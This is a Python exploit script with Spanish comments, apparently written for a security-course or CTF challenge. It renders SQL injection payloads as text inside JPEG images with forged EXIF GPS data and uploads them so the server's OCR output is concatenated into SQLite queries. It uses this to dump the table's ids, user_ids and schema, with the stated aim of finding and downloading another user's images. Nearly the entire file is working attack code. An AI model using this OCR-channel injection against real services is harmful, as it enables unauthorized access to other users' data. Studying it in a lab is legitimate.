# ocr_dump_victim.py — la tabla real es `imagenes` (no `images`). Con eso el FROM ya no rompe.
# Extraemos vía el oráculo OCR:
#   - todos los user_id distintos (para ubicar a la víctima != el nuestro)
#   - el mapa id -> user_id, para saber qué imagen (probable id=1) es de la víctima
#   - filenames de la víctima, para bajarlos de /uploads/<filename>
# group_concat evita el problema de subquery escalar con múltiples filas.
import requests, base64, re, os
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-5164f230-2a03-41d3-b9a5-9d2931b34c94-mis-viajes-v2.softwareseguro.com.ar"
PAISAJE = "assets/paisaje.png" if os.path.exists("assets/paisaje.png") else "paisaje.png"
html = requests.get(BASE + "/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open(PAISAJE).convert("RGB")
q = "'"


def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf", "C:/Windows/Fonts/cour.ttf"]:
        try:
            return ImageFont.truetype(p, sz)
        except Exception:
            pass
    return ImageFont.load_default()


def build(text, fname, size=30):
    W = min(2000, max(1000, 40 + int(len(text) * size * 0.56)))
    H = 260
    img = base_img.resize((W, H)); d = ImageDraw.Draw(img); f = font(size)
    bb = d.textbbox((20, 20), text, font=f)
    d.rectangle([0, 0, W, bb[3] + 20], fill=(255, 255, 255))
    d.text((20, 20), text, font=f, fill=(0, 0, 0))
    img.save(fname, "jpeg", quality=72, optimize=True)

    def dms(x):
        dd = int(x); mm = int((x - dd) * 60); s = round((x - dd - mm / 60) * 3600, 4)
        return ((dd, 1), (mm, 1), (int(s * 100), 100))
    exd = {'0th': {piexif.ImageIFD.Make: b'Samsung', piexif.ImageIFD.Model: b'Galaxy S25'},
           'Exif': {piexif.ExifIFD.DateTimeOriginal: b'2025:10:01 23:51:37'},
           'GPS': {piexif.GPSIFD.GPSLatitudeRef: b'S', piexif.GPSIFD.GPSLatitude: dms(41.13),
                   piexif.GPSIFD.GPSLongitudeRef: b'W', piexif.GPSIFD.GPSLongitude: dms(71.31)}}
    piexif.insert(piexif.dump(exd), fname)
    return "data:image/jpeg;base64," + base64.b64encode(open(fname, "rb").read()).decode()


def ex(inner, desc):
    painted = "9" + q + "||(" + inner + ")||" + q + "9"
    fname = f"dv_{desc}.jpg"
    uri = build(painted, fname)
    r = requests.post(f"{BASE}/upload", json={"image": uri, "description": desc, "user_id": UID})
    ocr = ""
    if r.status_code == 200:
        data = requests.get(f"{BASE}/images/{UID}").json()
        row = next((x for x in data if x.get("description") == desc), None)
        ocr = row.get("summary_ocr", "") if row else ""
    print(f"[{desc:18}] {r.status_code}  ocr={ocr!r}")
    return r.status_code, ocr


print(f"UID propio: {UID}\n=== dump desde la tabla `imagenes` (sin comillas en la query) ===\n")
ex("SELECT count(*) FROM imagenes", "count")
ex("SELECT group_concat(id) FROM imagenes", "all_ids")
ex("SELECT group_concat(user_id) FROM imagenes", "all_uids")
# id -> user_id concatenado con char(58)=':' para no usar comillas
ex("SELECT group_concat(id||char(58)||user_id) FROM imagenes", "id_uid_map")
# esquema de la tabla (nombres de columnas), char(105)='i' -> WHERE name like ... evitado; usamos tbl
ex("SELECT sql FROM sqlite_master LIMIT 1", "schema")
